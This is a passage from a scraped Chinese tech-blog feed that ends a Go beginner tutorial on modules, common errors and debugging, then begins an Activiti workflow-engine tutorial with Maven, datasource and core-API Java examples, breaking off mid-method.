        c.JSON(<span class="hljs-number">200</span>, gin.H{
            <span class="hljs-string">"message"</span>: <span class="hljs-string">"Hello, Go!"</span>,
        })
    })
    r.Run(<span class="hljs-string">":8080"</span>) <span class="hljs-comment">// 启动服务</span>
}
</code></pre>
</li>
<li>
<p>执行<code>go mod tidy</code>：</p>
<pre><code class="hljs language-Bash" lang="Bash">
go mod tidy
</code></pre>
<p>该命令会自动分析代码中的依赖，下载缺失的依赖，并删除无用的依赖。执行后会生成<code>go.sum</code>文件（记录依赖的哈希值，保证依赖完整性），<code>go.mod</code>会新增依赖记录：</p>
<pre><code class="hljs language-Plain" lang="Plain">
module github.com/你的用户名/hello-go

go 1.22

require github.com/gin-gonic/gin v1.9.1

require (
    // 省略gin的依赖...
)
</code></pre>
</li>
</ol>
<h3 data-id="heading-26">7.3 常用Go Modules命令</h3>
<pre><code class="hljs language-Bash" lang="Bash">
go mod init  <span class="hljs-comment"># 初始化模块</span>
go mod tidy  <span class="hljs-comment"># 整理依赖</span>
go mod download  <span class="hljs-comment"># 下载依赖到本地缓存</span>
go mod vendor  <span class="hljs-comment"># 将依赖复制到项目的vendor目录</span>
go mod verify  <span class="hljs-comment"># 验证依赖的完整性</span>
</code></pre>
<h2 data-id="heading-27">8. 常见错误与调试入门</h2>
<p>新手写Go程序时，容易遇到一些常见错误，我们来总结并给出解决方法，同时入门基础调试技巧。</p>
<h3 data-id="heading-28">8.1 常见错误及解决</h3>
<ol>
<li>
<p><strong>错误1：包名不是main，但想生成可执行程序</strong></p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-comment">// 错误代码</span>
<span class="hljs-keyword">package</span> hello  <span class="hljs-comment">// 不是main包</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    fmt.Println(<span class="hljs-string">"Hello"</span>)
}
</code></pre>
<p>报错：<code>runtime.main_main·f: function main is undeclared in the main package</code></p>
<p>解决：将包名改为<code>main</code>。</p>
</li>
<li>
<p><strong>错误2：import导入了未使用的包</strong></p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"os"</span>  <span class="hljs-comment">// 导入但未使用</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    fmt.Println(<span class="hljs-string">"Hello"</span>)
}
</code></pre>
<p>报错：<code>imported and not used: "os"</code></p>
<p>解决：删除未使用的包导入，或使用<code>_</code>忽略（<code>import _ "os"</code>）。</p>
</li>
<li>
<p><strong>错误3：函数名大小写错误（对外暴露的函数首字母小写）</strong></p>
<pre><code class="hljs language-Go" lang="Go">
<span class="hljs-keyword">package</span> hello

<span class="hljs-comment">// 首字母小写，其他包无法导入</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">greet</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello"</span>
}
</code></pre>
<p>解决：对外暴露的函数首字母大写（<code>Greet</code>）。</p>
</li>
<li>
<p><strong>错误4：go build跨平台编译时CGO未禁用</strong></p>
</li>
</ol>
<p>报错：<code>cannot load C:\Program Files\Go\pkg\windows_amd64\runtime/cgo: open ...: permission denied</code></p>
<p>解决：编译时加<code>CGO_ENABLED=0</code>（见4.3节）。</p>
<h3 data-id="heading-29">8.2 调试入门（使用VS Code）</h3>
<ol>
<li>
<p><strong>配置调试环境</strong>：</p>
<ul>
<li>
<p>在VS Code中打开项目，点击左侧“运行和调试”（Ctrl+Shift+D）。</p>
</li>
<li>
<p>点击“创建launch.json文件”，选择“Go”，自动生成调试配置。</p>
</li>
</ul>
</li>
<li>
<p><strong>设置断点</strong>：</p>
</li>
</ol>
<p>在代码行号左侧点击，出现红色圆点即为断点（比如<code>fmt.Println</code>那一行）。</p>
<ol>
<li><strong>启动调试</strong>：</li>
</ol>
<p>点击“启动调试”（F5），程序会停在断点处，可查看变量、单步执行（F10）、继续执行（F5）。</p>
<h3 data-id="heading-30">8.3 基础调试命令（终端）</h3>
<p>若没有IDE，可使用<code>go run</code>结合打印语句调试，或使用<code>dlv</code>（Delve，Go官方调试工具）：</p>
<pre><code class="hljs language-Bash" lang="Bash">
<span class="hljs-comment"># 安装dlv</span>
go install github.com/go-delve/delve/cmd/dlv@latest

<span class="hljs-comment"># 启动调试</span>
dlv debug main.go

<span class="hljs-comment"># 调试命令</span>
(dlv) <span class="hljs-built_in">break</span> main.go:10  <span class="hljs-comment"># 在第10行设置断点</span>
(dlv) run               <span class="hljs-comment"># 运行程序</span>
(dlv) next              <span class="hljs-comment"># 单步执行</span>
(dlv) <span class="hljs-built_in">print</span> name        <span class="hljs-comment"># 打印变量name的值</span>
(dlv) <span class="hljs-built_in">continue</span>          <span class="hljs-comment"># 继续执行</span>
(dlv) <span class="hljs-built_in">exit</span>              <span class="hljs-comment"># 退出调试</span>
</code></pre>
<h2 data-id="heading-31">总结</h2>
<ol>
<li>
<p><strong>环境搭建</strong>：优先使用官方安装包，多版本管理用<code>gvm</code>，无需纠结<code>GOPATH</code>，Go1.16+默认启用模块模式。</p>
</li>
<li>
<p><strong>程序核心结构</strong>：<code>main</code>包+<code>main</code>函数是可执行程序的入口，<code>import</code>导入依赖包，代码需遵循Go的命名和注释规范。</p>
</li>
<li>
<p><strong>项目管理</strong>：用<code>go mod init</code>初始化模块，<code>go mod tidy</code>管理依赖，<code>go run</code>调试、<code>go build</code>编译部署。</p>
</li>
<li>
<p><strong>避坑与调试</strong>：常见错误多是包名、导入、命名规范问题，调试优先用VS Code断点调试，终端可用<code>dlv</code>工具。</p>
</li>
</ol>
<p>到这里，你已经掌握了Go程序的基础开发流程，接下来可以尝试写一些简单的小程序（比如计算器、文件读写），巩固今天的知识点。如果有任何问题，欢迎在评论区交流～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Activiti工作流从入门到精通]]></title>    <link>https://juejin.cn/post/7597266141913219118</link>    <guid>https://juejin.cn/post/7597266141913219118</guid>    <pubDate>2026-01-21T00:58:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597266141913219118" data-draft-id="7597276695403675689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Activiti工作流从入门到精通"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-01-21T00:58:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨中飘荡的记忆"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Activiti工作流从入门到精通
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨中飘荡的记忆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:58:09.000Z" title="Wed Jan 21 2026 00:58:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Activiti工作流从入门到精通</h2>
<h3 data-id="heading-1">一、什么是Activiti？</h3>
<p>Activiti是一个开源的工作流引擎，它实现了BPMN 2.0（Business Process Model and Notation）规范，可以用于自动化业务流程。Activiti由Alfresco软件公司开发，基于Apache许可协议发布，是目前最流行的轻量级工作流引擎之一。</p>
<h4 data-id="heading-2">1.1 核心概念</h4>
<ul>
<li><strong>流程引擎（Process Engine）</strong>：Activiti的核心，负责流程的执行和管理</li>
<li><strong>BPMN</strong>：业务流程建模与 notation，一种标准的流程建模语言</li>
<li><strong>流程定义（Process Definition）</strong>：业务流程的静态描述，通常以BPMN XML格式存储</li>
<li><strong>流程实例（Process Instance）</strong>：流程定义的一次执行</li>
<li><strong>任务（Task）</strong>：流程中的工作单元，需要由用户或系统完成</li>
<li><strong>服务任务（Service Task）</strong>：自动执行的系统任务</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff113f1365394f5f9ba6f9ab92659066~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769561888&amp;x-signature=GTUcCTpOlYyk6XiCN0uN8t8Cg%2FI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">二、环境搭建</h3>
<h4 data-id="heading-4">2.1 Maven依赖配置</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 在pom.xml中添加Activiti依赖 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Activiti核心依赖 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.activiti<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>activiti-engine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.1.0.M6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Activiti Spring集成 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.activiti<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>activiti-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.1.0.M6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- BPMN建模工具 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.activiti<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>activiti-bpmn-model<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.1.0.M6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL驱动 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.28<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 数据库连接池 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h4 data-id="heading-5">2.2 配置流程引擎</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.config;

<span class="hljs-keyword">import</span> org.activiti.engine.ProcessEngine;
<span class="hljs-keyword">import</span> org.activiti.engine.ProcessEngineConfiguration;
<span class="hljs-keyword">import</span> org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-keyword">import</span> javax.sql.DataSource;

<span class="hljs-comment">/**
 * Activiti流程引擎配置类
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivitiConfig</span> {

    <span class="hljs-meta">@Value("${spring.datasource.url}")</span>
    <span class="hljs-keyword">private</span> String url;

    <span class="hljs-meta">@Value("${spring.datasource.username}")</span>
    <span class="hljs-keyword">private</span> String username;

    <span class="hljs-meta">@Value("${spring.datasource.password}")</span>
    <span class="hljs-keyword">private</span> String password;

    <span class="hljs-meta">@Value("${spring.datasource.driver-class-name}")</span>
    <span class="hljs-keyword">private</span> String driverClassName;

    <span class="hljs-comment">/**
     * 配置流程引擎
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ProcessEngineConfiguration <span class="hljs-title function_">processEngineConfiguration</span><span class="hljs-params">()</span> {
        <span class="hljs-type">StandaloneProcessEngineConfiguration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandaloneProcessEngineConfiguration</span>();

        <span class="hljs-comment">// 配置数据库连接</span>
        configuration.setJdbcDriver(driverClassName);
        configuration.setJdbcUrl(url);
        configuration.setJdbcUsername(username);
        configuration.setJdbcPassword(password);

        <span class="hljs-comment">// 数据库策略配置</span>
        <span class="hljs-comment">// DB_SCHEMA_UPDATE_TRUE：如果表不存在，自动创建表</span>
        <span class="hljs-comment">// DB_SCHEMA_UPDATE_FALSE：不自动更新表结构</span>
        <span class="hljs-comment">// DB_SCHEMA_UPDATE_CREATE_DROP：先创建表，关闭时删除表</span>
        configuration.setDatabaseSchemaUpdate(ProcessEngineConfiguration.DB_SCHEMA_UPDATE_TRUE);

        <span class="hljs-comment">// 异步执行器配置</span>
        configuration.setAsyncExecutorActivate(<span class="hljs-literal">true</span>);
        configuration.setAsyncExecutorEnabled(<span class="hljs-literal">true</span>);

        <span class="hljs-keyword">return</span> configuration;
    }

    <span class="hljs-comment">/**
     * 创建流程引擎Bean
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ProcessEngine <span class="hljs-title function_">processEngine</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> processEngineConfiguration().buildProcessEngine();
    }
}
</code></pre>
<h4 data-id="heading-6">2.3 创建数据库初始化配置</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.config;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSource;

<span class="hljs-keyword">import</span> javax.sql.DataSource;

<span class="hljs-comment">/**
 * 数据源配置
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
        <span class="hljs-type">DruidDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
        dataSource.setUrl(<span class="hljs-string">"jdbc:mysql://localhost:3306/activiti_db?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=Asia/Shanghai"</span>);
        dataSource.setUsername(<span class="hljs-string">"root"</span>);
        dataSource.setPassword(<span class="hljs-string">"123456"</span>);
        dataSource.setDriverClassName(<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>);

        <span class="hljs-comment">// 连接池配置</span>
        dataSource.setInitialSize(<span class="hljs-number">5</span>);
        dataSource.setMinIdle(<span class="hljs-number">5</span>);
        dataSource.setMaxActive(<span class="hljs-number">20</span>);
        dataSource.setMaxWait(<span class="hljs-number">60000</span>);

        <span class="hljs-keyword">return</span> dataSource;
    }
}
</code></pre>
<h3 data-id="heading-7">三、核心API详解</h3>
<h4 data-id="heading-8">3.1 流程引擎服务架构</h4>
<p>Activiti提供了多个核心服务接口，每个接口负责不同的功能模块：
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d98906ab21de43d5a0344777c273e536~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769561888&amp;x-signature=v9X%2BjYNcMukM6ytxQnj3s8bdEzM%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-9">3.2 核心服务接口</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.activiti.service;

<span class="hljs-keyword">import</span> org.activiti.engine.*;
<span class="hljs-keyword">import</span> org.activiti.engine.repository.Deployment;
<span class="hljs-keyword">import</span> org.activiti.engine.runtime.ProcessInstance;
<span class="hljs-keyword">import</span> org.activiti.engine.task.Task;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">/**
 * Activiti核心服务使用示例
 */</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ActivitiCoreService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProcessEngine processEngine;

    <span class="hljs-comment">/**
     * 获取流程定义服务 - 管理流程定义和部署
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">repositoryServiceExample</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RepositoryService</span> <span class="hljs-variable">repositoryService</span> <span class="hljs-operator">=</span> processEngine.getRepositoryService();

        <span class="hljs-comment">// 部署流程定义</span>
        <span class="hljs-type">Deployment</span> <span class="hljs-variable">deployment</span> <span class="hljs-operator">=</span> repositoryService.createDeployment()
                .addClasspathResource(<span class="hljs-string">"processes/leave-request.bpmn20.xml"</span>)
                .name(<span class="hljs-string">"请假流程"</span>)
                .deploy();

        System.out.println(<span class="hljs-string">"流程部署ID: "</span> + deployment.getId());
        System.out.println(<span class="hljs-string">"流程部署名称: "</span> + deployment.getName());
    }

    <span class="hljs-comment">/**
     * 获取运行时服务 - 启动流程实例、查询流程实例
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">runtimeServiceExample</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RuntimeService</span> <span class="hljs-variable">runtimeService</span> <span class="hljs-operator">=</span> processEngine.getRuntimeService();

        <span class="hljs-comment">// 设置流程变量</span>
        Map&lt;String, Object&gt; variables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        variables.put(<span class="hljs-string">"applicant"</span>, <span class="hljs-string">"张三"</span>);
        variables.put(<span class="hljs-string">"days"</span>, <span class="hljs-number">3</span>);

        <span class="hljs-comment">// 启动流程实例</span>
        <span class="hljs-type">ProcessInstance</span> <span class="hljs-variable">processInstance</span> <span class="hljs-operator">=</span> runtimeService.startProcessInstanceByKey(
                <span class="hljs-string">"leaveRequest"</span>,
                variables
        );

        System.out.println(<span class="hljs-string">"流程实例ID: "</span> + processInstance.getId());
        System.out.println(<span class="hljs-string">"流程定义ID: "</span> + processInstance.getProcessDefinitionId());

        <span class="hljs-keyword">return</span> processInstance.getId();
    }

    <span class="hljs-comment">/**
     * 获取任务服务 - 查询、完成用户任务
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">taskServiceExample</span><span class="hljs-params">(String processInstanceId)</span> {
        <span class="hljs-type">TaskService</span> <span class="hljs-variable">taskService</span> <span class="hljs-operator">=</span> processEngine.getTaskService();

        <span class="hljs-comment">// 查询待办任务</span>
        List&lt;Task&gt; tasks = taskService.createTaskQuery()
                .processInstanceId(processInstanceId)
                .list();

        <span class="hljs-keyword">for</span> (Task task : tasks) {
            System.out.println(<span class="hljs-string">"任务ID: "</span> + task.getId());
            System.out.println(<span class="hljs-string">"任务名称: "</span> + task.getName());
            System.out.println(<span class="hljs-string">"任务办理人: "</span> + task.getAssignee());

            <span class="hljs-comment">// 设置任务变量</span>
            Map&lt;String, Object&gt; taskVariables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            taskVariables.put(<span class="hljs-string">"approved"</span>, <span class="hljs-literal">true</span>);
            taskVariables.put(<span class="hljs-string">"comment"</span>, <span class="hljs-string">"同意请假"</span>);

            <span class="hljs-comment">// 完成任务</span>
            taskService.complete(task.getId(), taskVariables);
        }
    }

    <span class="hljs-comment">/**
     * 获取历史服务 - 查询历史数据
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">historyServiceExample</span><span class="hljs-params">(String processInstanceId)</span> {
        <span class="hljs-type">HistoryService</span> <span class="hljs-variable">historyService</span> <span class="hljs-operator">=</span> processEngine.getHistoryService();

        <span class="hljs-comment">// 查询已完成的历史任务</span>
        List&lt;org.activiti.engine.task.history.HistoricTaskInstance&gt; historicTasks =
                historyService.createHistoricTaskInstanceQuery()
                        .processInstanceId(processInstanceId)
                        .finished()
                        .orderByHistoricTaskInstanceEndTime()
                        .asc()
                        .list();

        <span class="hljs-keyword">for</span> (org.activiti.engine.task.history.HistoricTaskInstance historicTask : historicTasks) {
            System.out.println(<span class="hljs-string">"历史任务ID: "</span> + historicTask.getId());
            System.out.println(<span class="hljs-string">"历史任务名称: "</span> + historicTask.getName());
            System.out.println(<span class="hljs-string">"完成时间: "</span> + historicTask.getEndTime());
        }
    }

    <span class="hljs-comment">/**
     * 获取管理服务 - 执行管理和运维操作
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">managementServiceExample</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ManagementService</span> <span class="hljs-variable">managementService</span> <span class="hljs-operator">=</span> processEngine.getManagementService();

        <span class="hljs-comment">// 执行自定义SQL查询</span>
